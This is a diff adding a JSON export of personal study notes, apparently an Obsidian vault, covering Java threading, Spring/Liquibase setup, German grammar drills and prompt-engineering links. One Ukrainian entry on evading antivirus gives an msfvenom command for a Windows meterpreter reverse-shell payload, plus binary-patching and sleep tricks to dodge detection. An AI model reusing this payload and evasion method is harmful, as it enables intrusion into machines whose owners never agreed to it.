@@ -1,0 +1,686 @@
+{
+  "category": "other",
+  "count": 38,
+  "generated": "2026-06-24T09:04:41.081561",
+  "documents": [
+    {
+      "id": "README",
+      "title": "README",
+      "content": "#\u0000 \u0000M\u0000y\u0000O\u0000b\u0000s\u0000i\u0000d\u0000i\u0000a\u0000n\u0000\n\u0000\n\u0000",
+      "full_content": "#\u0000 \u0000M\u0000y\u0000O\u0000b\u0000s\u0000i\u0000d\u0000i\u0000a\u0000n\u0000\n\u0000\n\u0000",
+      "category": "other",
+      "tags": [
+        "general"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 1094
+    },
+    {
+      "id": "DeutshclandTicket  проъздний",
+      "title": "DeutshclandTicket  проъздний",
+      "content": "1   -----------\n2   Связи:\n3   Теги:\n\nяк анулювати: **kundigen Vertrag**\n\nProfil -> abos verwalten -> Deutshcland Ticket 49 -> Abo anzeigen ->\n-> Kundigung (вибрати причину вибираю Ohhe angabe) -> Ohhe angabe ->\n-> записуэмо дату розырвання(кинець мисяця) -> Kundigungesbestatigung ->\n-> вписуэться емейл -> Вибираю роздил дали -> там перевыряю своъ дани ->\n-> Abo kundigen -> повинно зразу прийти пидтвердження",
+      "full_content": "1   -----------\n2   Связи:\n3   Теги:\n\nяк анулювати: **kundigen Vertrag**\n\nProfil -> abos verwalten -> Deutshcland Ticket 49 -> Abo anzeigen ->\n-> Kundigung (вибрати причину вибираю Ohhe angabe) -> Ohhe angabe ->\n-> записуэмо дату розырвання(кинець мисяця) -> Kundigungesbestatigung ->\n-> вписуэться емейл -> Вибираю роздил дали -> там перевыряю своъ дани ->\n-> Abo kundigen -> повинно зразу прийти пидтвердження",
+      "category": "other",
+      "tags": [
+        "kundigen",
+        "vertrag",
+        "verwalten",
+        "вибрати",
+        "abos"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 26937
+    },
+    {
+      "id": "GPT",
+      "title": "GPT",
+      "content": "1   -----------\n2   Связи: [[сервисы AI]]\n3   Теги: [[Промт инженеринг]] \n\n\nЯзыковая модель основана на статических паттернах\nимитация разговора с человеком \n\n**deepl**  Дипл   исползовать вместо гугл переводчика\n\nязыковая модель состоит из 2 частей **декодера** и **энкодера** и связей между ними, \nкоторые состоят в стеках, \nстэки формируются в зависимости от задач.\nчем их больше тем лучше работает модель.\n\nВЕБ разработчики не имеют к ним прямого доступа\n\nданные энкод и декодеров заливаются из программ.",
+      "full_content": "1   -----------\n2   Связи: [[сервисы AI]]\n3   Теги: [[Промт инженеринг]] \n\n\nЯзыковая модель основана на статических паттернах\nимитация разговора с человеком \n\n**deepl**  Дипл   исползовать вместо гугл переводчика\n\nязыковая модель состоит из 2 частей **декодера** и **энкодера** и связей между ними, \nкоторые состоят в стеках, \nстэки формируются в зависимости от задач.\nчем их больше тем лучше работает модель.\n\nВЕБ разработчики не имеют к ним прямого доступа\n\nданные энкод и декодеров заливаются из программ.",
+      "category": "other",
+      "tags": [
+        "дипл",
+        "основана",
+        "гугл",
+        "вместо",
+        "паттернах"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 59510
+    },
+    {
+      "id": "Legacy code(устаревший код)",
+      "title": "Legacy code(устаревший код)",
+      "content": "﻿\n\n\n1   -----------\n2   Связи:\n3   Теги:Legacy code устаревший код",
+      "full_content": "﻿\n\n\n1   -----------\n2   Связи:\n3   Теги:Legacy code устаревший код",
+      "category": "other",
+      "tags": [
+        "code",
+        "устаревший",
+        "legacy",
+        "теги",
+        "связи"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 91247
+    },
+    {
+      "id": "Liquibase  Ликибейс",
+      "title": "Liquibase  Ликибейс",
+      "content": "---\ntitle: \"--- Liquibase ------\"\ncategory: \"networking\"\ntags: ['projects', 'boot', 'aharmaz', 'проэкт', 'группы']\nstatus: \"published\"\ncreated: \"2026-03-24\"\nupdated: \"2026-03-24\"\nai-processed: false\nsource: \"manual\"\nquality: 1\nrelated-files: []\n---\n\n﻿\n1   -----------\n2   Связи:[[Проэкт группы]] [[проэкт на spring bot]] \n3   Теги: [[Liquibase  Ликибейс]]\nстатья\nhttps://dev.to/aharmaz/liquibase-for-[[Spring]]-boot-projects-5hf6\ndependensies:\n<dependency>\n\t\t\t<groupId>org.liquibase</groupId>\n\t\t\t<artifactId>liquibase-core</artifactId>\n\t\t\t<version>4.27.0</version>\n\t\t</dependency>\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<databaseChangeLog\n        xmlns=\"[[HTTP]]://www.liquibase.org/xml/ns/dbchangelog\"\n        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://www.liquibase.org/xml/ns/dbchangelog https://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.1.xsd\">\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<databaseChangeLog\n        xmlns=\"http://www.liquibase.org/xml/ns/dbchangelog\"\n        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://www.liquibase.org/xml/ns/dbchangelog https://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.1.xsd\">\n\n    <include file=\"db/migrations/001_schema.sql\"/>\n    <include file=\"db/migrations/002_data.sql\"/>\n\n</databaseChangeLog>\n\n\n#MySQL\nspring.datasource.url=jdbc:mysql://localhost:3306/library\nspring.datasource.username=root\nspring.datasource.password=root\n\nspring.[[JPA]].hibernate.ddl-auto=none\nspring.jpa.generate-ddl=false\n\n# --- Liquibase ------\nspring.liquibase.enabled=true\nspring.liquibase.change-log=classpath:/db/db.changelog-master.xml\n\n\n\n## кронвыражения статья\n\n\nhttps://tproger.ru/translations/guide-to-cron-jobs",
+      "full_content": "---\ntitle: \"--- Liquibase ------\"\ncategory: \"networking\"\ntags: ['projects', 'boot', 'aharmaz', 'проэкт', 'группы']\nstatus: \"published\"\ncreated: \"2026-03-24\"\nupdated: \"2026-03-24\"\nai-processed: false\nsource: \"manual\"\nquality: 1\nrelated-files: []\n---\n\n﻿\n1   -----------\n2   Связи:[[Проэкт группы]] [[проэкт на spring bot]] \n3   Теги: [[Liquibase  Ликибейс]]\nстатья\nhttps://dev.to/aharmaz/liquibase-for-[[Spring]]-boot-projects-5hf6\ndependensies:\n<dependency>\n\t\t\t<groupId>org.liquibase</groupId>\n\t\t\t<artifactId>liquibase-core</artifactId>\n\t\t\t<version>4.27.0</version>\n\t\t</dependency>\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<databaseChangeLog\n        xmlns=\"[[HTTP]]://www.liquibase.org/xml/ns/dbchangelog\"\n        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://www.liquibase.org/xml/ns/dbchangelog https://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.1.xsd\">\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<databaseChangeLog\n        xmlns=\"http://www.liquibase.org/xml/ns/dbchangelog\"\n        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://www.liquibase.org/xml/ns/dbchangelog https://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.1.xsd\">\n\n    <include file=\"db/migrations/001_schema.sql\"/>\n    <include file=\"db/migrations/002_data.sql\"/>\n\n</databaseChangeLog>\n\n\n#MySQL\nspring.datasource.url=jdbc:mysql://localhost:3306/library\nspring.datasource.username=root\nspring.datasource.password=root\n\nspring.[[JPA]].hibernate.ddl-auto=none\nspring.jpa.generate-ddl=false\n\n# --- Liquibase ------\nspring.liquibase.enabled=true\nspring.liquibase.change-log=classpath:/db/db.changelog-master.xml\n\n\n\n## кронвыражения статья\n\n\nhttps://tproger.ru/translations/guide-to-cron-jobs",
+      "category": "other",
+      "tags": [],
+      "status": "published",
+      "created": "",
+      "updated": "",
+      "quality": 3,
+      "embedding_hash": 11906
+    },
+    {
+      "id": "ObjectMapper",
+      "title": "ObjectMapper",
+      "content": "1   -----------\n2   Связи: [[json]]\n3   Теги:",
+      "full_content": "1   -----------\n2   Связи: [[json]]\n3   Теги:",
+      "category": "other",
+      "tags": [
+        "теги",
+        "связи",
+        "json"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 11594
+    },
+    {
+      "id": "Phaser",
+      "title": "Phaser",
+      "content": "1   -----------\n2   Связи: [[многопоточность]] [[поток]]\n3   Теги:[[Phaser]]\n\nодин из способов синхронизации потока который позволяет\n- разделять циклы синхронизации\n- дает свободу участия потоков в синхронизации\n-  можно с помоцю наблюдателей  следить за активностью точки синхронизации",
+      "full_content": "1   -----------\n2   Связи: [[многопоточность]] [[поток]]\n3   Теги:[[Phaser]]\n\nодин из способов синхронизации потока который позволяет\n- разделять циклы синхронизации\n- дает свободу участия потоков в синхронизации\n-  можно с помоцю наблюдателей  следить за активностью точки синхронизации",
+      "category": "other",
+      "tags": [
+        "способов",
+        "поток",
+        "phaser",
+        "свободу",
+        "синхронизации"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 54979
+    },
+    {
+      "id": "Verben дієслово",
+      "title": "Verben дієслово",
+      "content": "﻿\n1   -----------\n2   Связи: [[deutsch]] [[сильні дієслова starke werbung]] [[слабкі дієслова 1 групи schwache werbung]]\n3   Теги:  [[Verben дієслово]]",
+      "full_content": "﻿\n1   -----------\n2   Связи: [[deutsch]] [[сильні дієслова starke werbung]] [[слабкі дієслова 1 групи schwache werbung]]\n3   Теги:  [[Verben дієслово]]",
+      "category": "other",
+      "tags": [
+        "deutsch",
+        "слабкі",
+        "дієслово",
+        "starke",
+        "werbung"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 109748
+    },
+    {
+      "id": "Xexeditor і антивіруси",
+      "title": "Xexeditor і антивіруси",
+      "content": "  ----------\n2 Звязки : [[попереднє використання msfvenom . генерація корисної нагрузки]] ,[[створення корисного навантаження (корисної нагрузки) з допомогою Msvenom]] , [[Генерація корисної нагрузки PowerShell  з допомогою Veil]], [[створення корисного навантаження з TheFatRat]]\n3 Теги : [[Xexeditor і антивіруси]]\n\nдля обходу вірусів можна примінити : \n- закодувати свої програми чи свої ж корисні навантаження. (чувак був закодував на  мові С , але це довго не триває, один хуй доберуться.). Треба вміти компілювати код на якійсь мові програмування.\n- постійно обновляти корисні нагрузки.\n- пробувати компілювати на різних мовах.\n- трохи змінити двоїчний код після створення корисного навантаження.. \nстворюю корисну нагрузку :\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.109  LPORT=5555 -f exe -o shell.exe \nце найвідоміша в світі корисна нагрузка, її хаває кожен антивірус\n\nдивлюся на її хеш:\n──(kali㉿kali)-[~/Downloads]\n└─$ md5sum shell.exe \n3949070cc8eb8e5acd7be4c6824cf488  shell.exe\n\nзмшнивши двоїчний хeш програми змінюється контрольна сума.\nдля змiни використовуєм вшитий в калі інструмент hexeditor\n\nhexeditor shell.exe\n в двоїчному коді можна міняти не все, бо піздєц.\n можна зокркме міняти код в (programm cannon be ruf in DOS(шукати по двоїчному коду))\nможна ще знайти text (починається на 74)і там міняти \n зберігати зміни як у нано(ctr o   enter     ctrx)\n відповідно зміниться і хеш.\n\n- ще непогано встановити затримку (SLEEP)\n\n\n\n\n\nkino: \nhttps://www.youtube.com/watch?v=3uUrmvcj61M&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=69",
+      "full_content": "  ----------\n2 Звязки : [[попереднє використання msfvenom . генерація корисної нагрузки]] ,[[створення корисного навантаження (корисної нагрузки) з допомогою Msvenom]] , [[Генерація корисної нагрузки PowerShell  з допомогою Veil]], [[створення корисного навантаження з TheFatRat]]\n3 Теги : [[Xexeditor і антивіруси]]\n\nдля обходу вірусів можна примінити : \n- закодувати свої програми чи свої ж корисні навантаження. (чувак був закодував на  мові С , але це довго не триває, один хуй доберуться.). Треба вміти компілювати код на якійсь мові програмування.\n- постійно обновляти корисні нагрузки.\n- пробувати компілювати на різних мовах.\n- трохи змінити двоїчний код після створення корисного навантаження.. \nстворюю корисну нагрузку :\n\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.109  LPORT=5555 -f exe -o shell.exe \nце найвідоміша в світі корисна нагрузка, її хаває кожен антивірус\n\nдивлюся на її хеш:\n──(kali㉿kali)-[~/Downloads]\n└─$ md5sum shell.exe \n3949070cc8eb8e5acd7be4c6824cf488  shell.exe\n\nзмшнивши двоїчний хeш програми змінюється контрольна сума.\nдля змiни використовуєм вшитий в калі інструмент hexeditor\n\nhexeditor shell.exe\n в двоїчному коді можна міняти не все, бо піздєц.\n можна зокркме міняти код в (programm cannon be ruf in DOS(шукати по двоїчному коду))\nможна ще знайти text (починається на 74)і там міняти \n зберігати зміни як у нано(ctr o   enter     ctrx)\n відповідно зміниться і хеш.\n\n- ще непогано встановити затримку (SLEEP)\n\n\n\n\n\nkino: \nhttps://www.youtube.com/watch?v=3uUrmvcj61M&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=69",
+      "category": "other",
+      "tags": [],
+      "status": "published",
+      "created": "",
+      "updated": "",
+      "quality": 3,
+      "embedding_hash": 66446
+    },
+    {
+      "id": "deutsch mit",
+      "title": "deutsch mit",
+      "content": "﻿\n1   -----------\n2   Связи: [[unterricht 3   Numbers Hausaufgabe]] \n3   Теги: singular plural\n\nich telefoniere\ndu telefonierst\ner telefoniert\nwir telefonieren\nihr telefonierst\nsie telefonieren\n tanzt du gerne?\n Ja , aber mein Freund tanzt leider nicht.\n ich vershtehe dich nicht\n Nein, leider nicht. Ich arbeite heute bis acht und \n\n**Haben** \nicn habe\ndu hast \ner hat\nwir haben \nihr habt\nsie haben \n**der Hunner** , Das Pech, der Hundert, der Durst, das Geld, Die Schmertzen\n\nIch habe Gluck\nDie Kinder haben Durst\nEr hat kein Geld\nSie haben viel Geld\n Meine Tochter hat Zeit\n Die Frau hat Pech \n Er hat keine Zeit\n Es hat grosse Schmerzen\n Ich habe Kinder\n Du hast zwei Tochter\n Sie haben Hunder\n _______\nHabe ich Gluck?\nHaben die Kinder Durst?\nHast er Geld?\nHat sie viel Geld?\nHat meine Tochter Zeit?\nHat die Frau Pech?\nHat er keine Zeit?\nHat es grosse Schmertzen?\nHabe ich Kinder?\nHast du zwei Tochter?\nHaben Sie Hunger?\n    ----  **sein** --------\n  ich bin\n  du bist\n  er ist\n  wir sind\n  ihr seid\n  sie sind\n  -----------\nMeine Muter ist alt.\nDas Hendy ist teuer.\nEs ist nicht billig.\nDas Papir ist weis.\nDie Wohnung sind gunstig.\nEs ist acht Wochen alt.\nDie Hose ist schwarz.\nDie Kinder sind gross.\nIch bin jung.\nDu bist alt.\nIhr seid aus der Ukraine.\nWir sind aus Frankreich.\nDas Haus ist klein.\nBirgit und Amelia sind Schwestern.\nSie sind aus Frankreich.",
+      "full_content": "﻿\n1   -----------\n2   Связи: [[unterricht 3   Numbers Hausaufgabe]] \n3   Теги: singular plural\n\nich telefoniere\ndu telefonierst\ner telefoniert\nwir telefonieren\nihr telefonierst\nsie telefonieren\n tanzt du gerne?\n Ja , aber mein Freund tanzt leider nicht.\n ich vershtehe dich nicht\n Nein, leider nicht. Ich arbeite heute bis acht und \n\n**Haben** \nicn habe\ndu hast \ner hat\nwir haben \nihr habt\nsie haben \n**der Hunner** , Das Pech, der Hundert, der Durst, das Geld, Die Schmertzen\n\nIch habe Gluck\nDie Kinder haben Durst\nEr hat kein Geld\nSie haben viel Geld\n Meine Tochter hat Zeit\n Die Frau hat Pech \n Er hat keine Zeit\n Es hat grosse Schmerzen\n Ich habe Kinder\n Du hast zwei Tochter\n Sie haben Hunder\n _______\nHabe ich Gluck?\nHaben die Kinder Durst?\nHast er Geld?\nHat sie viel Geld?\nHat meine Tochter Zeit?\nHat die Frau Pech?\nHat er keine Zeit?\nHat es grosse Schmertzen?\nHabe ich Kinder?\nHast du zwei Tochter?\nHaben Sie Hunger?\n    ----  **sein** --------\n  ich bin\n  du bist\n  er ist\n  wir sind\n  ihr seid\n  sie sind\n  -----------\nMeine Muter ist alt.\nDas Hendy ist teuer.\nEs ist nicht billig.\nDas Papir ist weis.\nDie Wohnung sind gunstig.\nEs ist acht Wochen alt.\nDie Hose ist schwarz.\nDie Kinder sind gross.\nIch bin jung.\nDu bist alt.\nIhr seid aus der Ukraine.\nWir sind aus Frankreich.\nDas Haus ist klein.\nBirgit und Amelia sind Schwestern.\nSie sind aus Frankreich.",
+      "category": "other",
+      "tags": [
+        "singular",
+        "tanzt",
+        "unterricht",
+        "hausaufgabe",
+        "telefoniere"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 81577
+    },
+    {
+      "id": "deutsch",
+      "title": "deutsch",
+      "content": "1   -----------\n2   Связи: [[Personalpronomen Особові займенники]] [[unterricht 3   Numbers Hausaufgabe]] [[Verben дієслово]]\n3   Теги:[[deutsch]]",
+      "full_content": "1   -----------\n2   Связи: [[Personalpronomen Особові займенники]] [[unterricht 3   Numbers Hausaufgabe]] [[Verben дієслово]]\n3   Теги:[[deutsch]]",
+      "category": "other",
+      "tags": [
+        "unterricht",
+        "deutsch",
+        "hausaufgabe",
+        "numbers",
+        "personalpronomen"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 29875
+    },
+    {
+      "id": "integration tests",
+      "title": "integration tests",
+      "content": "1   -----------\n2   Связи:[[Testing]] \n3   Теги:",
+      "full_content": "1   -----------\n2   Связи:[[Testing]] \n3   Теги:",
+      "category": "other",
+      "tags": [
+        "testing",
+        "связи",
+        "теги"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 11886
+    },
+    {
+      "id": "interrupt",
+      "title": "interrupt",
+      "content": "﻿\n1   -----------\n2   Связи: #[[поток]]  [[поток ]] \n3   Теги: [[многопоточность ]]\n\n    public static void main(String[] args) throws InterruptedException {  \n        Runnable task = () -> {  \n            while (!Thread.currentThread().isInterrupted()) {  \n                System.out.println(\"Working ...\");  \n                for (int i = 0; i < 10_000_000; i++) {  \n                                    }  \n  \n                // выполняем какой то код  \n            }  \n            System.out.println(\"Thread finished\");  \n        };  \n        Thread thread = new Thread(task);  \n        thread.start();  \n        Thread.sleep(100);  \n        thread.interrupt();  \n    }  \n}",
+      "full_content": "﻿\n1   -----------\n2   Связи: #[[поток]]  [[поток ]] \n3   Теги: [[многопоточность ]]\n\n    public static void main(String[] args) throws InterruptedException {  \n        Runnable task = () -> {  \n            while (!Thread.currentThread().isInterrupted()) {  \n                System.out.println(\"Working ...\");  \n                for (int i = 0; i < 10_000_000; i++) {  \n                                    }  \n  \n                // выполняем какой то код  \n            }  \n            System.out.println(\"Thread finished\");  \n        };  \n        Thread thread = new Thread(task);  \n        thread.start();  \n        Thread.sleep(100);  \n        thread.interrupt();  \n    }  \n}",
+      "category": "other",
+      "tags": [
+        "interruptedexception",
+        "runnable",
+        "string",
+        "public",
+        "поток"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 105839
+    },
+    {
+      "id": "jacson",
+      "title": "jacson",
+      "content": "﻿для работы с XML используется библиотека XMLMapper\nдля работы с [[json]]  используется библиотека [[ObjectMapper]]\n\n@jsonIgnorePropertis [[аннотация]] работает с [[json]] and XML\n\n\n\n1   -----------\n2   Связи:  [[json]]  XML\n3   Теги:",
+      "full_content": "﻿для работы с XML используется библиотека XMLMapper\nдля работы с [[json]]  используется библиотека [[ObjectMapper]]\n\n@jsonIgnorePropertis [[аннотация]] работает с [[json]] and XML\n\n\n\n1   -----------\n2   Связи:  [[json]]  XML\n3   Теги:",
+      "category": "other",
+      "tags": [
+        "работает",
+        "библиотека",
+        "jsonignorepropertis",
+        "аннотация",
+        "xmlmapper"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 137119
+    },
+    {
+      "id": "json",
+      "title": "json",
+      "content": "﻿restController\n\n\n\n\n1   -----------\n2   Связи: MongoDB\n3   Теги:",
+      "full_content": "﻿restController\n\n\n\n\n1   -----------\n2   Связи: MongoDB\n3   Теги:",
+      "category": "other",
+      "tags": [
+        "mongodb",
+        "restcontroller",
+        "связи",
+        "теги"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 78265
+    },
+    {
+      "id": "sequryty секюрити",
+      "title": "sequryty секюрити",
+      "content": "1   -----------\n2   Связи:[[Мой проект индивидуальный]]\n3   Теги: [[sequryty секюрити]]",
+      "full_content": "1   -----------\n2   Связи:[[Мой проект индивидуальный]]\n3   Теги: [[sequryty секюрити]]",
+      "category": "other",
+      "tags": [
+        "секюрити",
+        "проект",
+        "индивидуальный",
+        "теги",
+        "sequryty"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 46113
+    },
+    {
+      "id": "tdd",
+      "title": "tdd",
+      "content": "1   -----------\n2   Связи:[[tdd]]\n3   Теги:",
+      "full_content": "1   -----------\n2   Связи:[[tdd]]\n3   Теги:",
+      "category": "other",
+      "tags": [
+        "связи",
+        "теги"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 11436
+    },
+    {
+      "id": "thema 9 Endlich Freizeit!",
+      "title": "thema 9 Endlich Freizeit!",
+      "content": "﻿\n1   -----------\n2   Связи: [[Personalpronomen Особові займенники]]\n3   Теги: Endlich Freizeit\n\nwas machst du in Freizeit.\nin der Freizeit reise ich gern\nFrei",
+      "full_content": "﻿\n1   -----------\n2   Связи: [[Personalpronomen Особові займенники]]\n3   Теги: Endlich Freizeit\n\nwas machst du in Freizeit.\nin der Freizeit reise ich gern\nFrei",
+      "category": "other",
+      "tags": [
+        "machst",
+        "frei",
+        "personalpronomen",
+        "reise",
+        "endlich"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 98540
+    },
+    {
+      "id": "unterricht 3   Numbers Hausaufgabe",
+      "title": "unterricht 3   Numbers Hausaufgabe",
+      "content": "﻿\n1   -----------\n2   Связи:\n3   Теги: ich bin , du hast, er mochte;\n\n-------Sein- Erganzen Sie----\nHerr Schneider: Guten Tag, wie ist Ihr Name?\nFrau Mistererek: Mein Name ist Misterek.\nHerr Schneider: Sind Sie neu hier?\nFrau Mistererek: Nein, ich bin schon ein Jahr in Hamburg.\nHerr Schneider:  Sind Sie Studentin?\nFrau Mistererek: Nein, ich bin Schulerin.\n\n-----2------\nIch bin funfzehn Jahre alt.\nDu bist Herr Wang.\nEr ist Glucklich.\nSie sind im Buro.\nWir sind in Munchen.\nIhr seid  Lehrer.\nFrau Tanberg ist aus Japan.\nMein Name ist Kolakowski.\nDas ist ein Worterbuch.\n\n----3 ----\n1. Hast du Geld?  Nein, aber ich habe Zeit.\nDu hast Gluck, ich habe kein Geld und keine Zeit.\n2. Habt ihr schon eine Wohnung hier in Meinz? \nNein, wir haben noch keine Wohnung, wir wohnen im Hotel.\n3. Her Kim hat viel Arbeit, er hat auch am Wochenende keine Freizeit.",
+      "full_content": "﻿\n1   -----------\n2   Связи:\n3   Теги: ich bin , du hast, er mochte;\n\n-------Sein- Erganzen Sie----\nHerr Schneider: Guten Tag, wie ist Ihr Name?\nFrau Mistererek: Mein Name ist Misterek.\nHerr Schneider: Sind Sie neu hier?\nFrau Mistererek: Nein, ich bin schon ein Jahr in Hamburg.\nHerr Schneider:  Sind Sie Studentin?\nFrau Mistererek: Nein, ich bin Schulerin.\n\n-----2------\nIch bin funfzehn Jahre alt.\nDu bist Herr Wang.\nEr ist Glucklich.\nSie sind im Buro.\nWir sind in Munchen.\nIhr seid  Lehrer.\nFrau Tanberg ist aus Japan.\nMein Name ist Kolakowski.\nDas ist ein Worterbuch.\n\n----3 ----\n1. Hast du Geld?  Nein, aber ich habe Zeit.\nDu hast Gluck, ich habe kein Geld und keine Zeit.\n2. Habt ihr schon eine Wohnung hier in Meinz? \nNein, wir haben noch keine Wohnung, wir wohnen im Hotel.\n3. Her Kim hat viel Arbeit, er hat auch am Wochenende keine Freizeit.",
+      "category": "other",
+      "tags": [
+        "erganzen",
+        "mein",
+        "sein",
+        "hier",
+        "hast"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 80685
+    },
+    {
+      "id": "Запись с Linkedin",
+      "title": "Запись с Linkedin",
+      "content": "1   -----------\n2   Связи:\n3   Теги:\n\n\n[https://vimeo.com/915635075/b81972388a](https://vimeo.com/915635075/b81972388a \"https://vimeo.com/915635075/b81972388a\")",
+      "full_content": "1   -----------\n2   Связи:\n3   Теги:\n\n\n[https://vimeo.com/915635075/b81972388a](https://vimeo.com/915635075/b81972388a \"https://vimeo.com/915635075/b81972388a\")",
+      "category": "other",
+      "tags": [
+        "https",
+        "vimeo",
+        "связи",
+        "теги"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 15599
+    },
+    {
+      "id": "Промпт инженеринг",
+      "title": "Промпт инженеринг",
+      "content": "1   -----------\n2   Связи:[[GPT]]\n3   Теги:\n\nПромпт  создание коротких четких запросов\n\n[[Промт инженеринг]] сейчас исп. большие компании\n\n\nкак создать промпт \n\n1. Задача - необходимо написать задачу (указать прямо )  **необходимо**\n2. контекст   **Важно**\n3. Пример    **Важно**\n4. Роль   Сказать действуй так(типа ты действуй как) **Желательно**\n5. Формат **Желательно**\n6. Тон    **Желательно**\n\nссылка на бесплатнфй сайт генерации картинок\n50+ Midjourney Prompts\n\nОфициальный туториал от Midjourney\n🔗\nhttps://docs.midjourney.com/docs/parameter-list\n\nMidjourney Prompt Generator\n🔗\nhttps://huggingface.co/spaces/doevent/prompt-generator\n🔗\nhttps://bootcamp.uxdesign.cc/50-midjourney-prompts-for-to-perfect-your-art-363996b702b6\n\nMidjourney Prompt Builder\n🔗\nhttps://www.imiprompt.com/builder\n\n\nMidjourney Prompt Builder\n🔗\nhttps://www.imiprompt.com/builde\n\n50+ Midjourney Prompts\n🔗\nhttps://bootcamp.uxdesign.cc/50-midjourney-prompts-for-to-perfect-your-art-363996b702b6\n\n\nAPI Documentation\nhttps://useapi.net/docs/start-here/setup-midjourney#example-of-discord-server-with-private-api-text-channel-and-midjourney-bot\n\n\n\nhttps://openai.com/index/introducing-chatgpt-and-whisper-apis/\n\n\nhttps://airtable.com/apprdK6RSuHRwWXO9/shr7Lo4UqIWKhQzTR?prefill_lessons=rec7HPIHenDiFLJh3",
+      "full_content": "1   -----------\n2   Связи:[[GPT]]\n3   Теги:\n\nПромпт  создание коротких четких запросов\n\n[[Промт инженеринг]] сейчас исп. большие компании\n\n\nкак создать промпт \n\n1. Задача - необходимо написать задачу (указать прямо )  **необходимо**\n2. контекст   **Важно**\n3. Пример    **Важно**\n4. Роль   Сказать действуй так(типа ты действуй как) **Желательно**\n5. Формат **Желательно**\n6. Тон    **Желательно**\n\nссылка на бесплатнфй сайт генерации картинок\n50+ Midjourney Prompts\n\nОфициальный туториал от Midjourney\n🔗\nhttps://docs.midjourney.com/docs/parameter-list\n\nMidjourney Prompt Generator\n🔗\nhttps://huggingface.co/spaces/doevent/prompt-generator\n🔗\nhttps://bootcamp.uxdesign.cc/50-midjourney-prompts-for-to-perfect-your-art-363996b702b6\n\nMidjourney Prompt Builder\n🔗\nhttps://www.imiprompt.com/builder\n\n\nMidjourney Prompt Builder\n🔗\nhttps://www.imiprompt.com/builde\n\n50+ Midjourney Prompts\n🔗\nhttps://bootcamp.uxdesign.cc/50-midjourney-prompts-for-to-perfect-your-art-363996b702b6\n\n\nAPI Documentation\nhttps://useapi.net/docs/start-here/setup-midjourney#example-of-discord-server-with-private-api-text-channel-and-midjourney-bot\n\n\n\nhttps://openai.com/index/introducing-chatgpt-and-whisper-apis/\n\n\nhttps://airtable.com/apprdK6RSuHRwWXO9/shr7Lo4UqIWKhQzTR?prefill_lessons=rec7HPIHenDiFLJh3",
+      "category": "other",
+      "tags": [
+        "запросов",
+        "написать",
+        "сейчас",
+        "создание",
+        "промпт"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 60491
+    },
+    {
+      "id": "Промт инженеринг",
+      "title": "Промт инженеринг",
+      "content": "1   -----------\n2   Связи:[[ GPT]] [[Мои промпты]]  [[сборщик проекта]]\n\n\n3   Теги:  [[Мои промпты]]",
+      "full_content": "1   -----------\n2   Связи:[[ GPT]] [[Мои промпты]]  [[сборщик проекта]]\n\n\n3   Теги:  [[Мои промпты]]",
+      "category": "other",
+      "tags": [
+        "промпты",
+        "сборщик",
+        "теги",
+        "проекта",
+        "связи"
+      ],
+      "status": "published",
+      "created": "2026-03-24",
+      "updated": "2026-03-24",
+      "quality": 1,
+      "embedding_hash": 49622
+    },
+    {
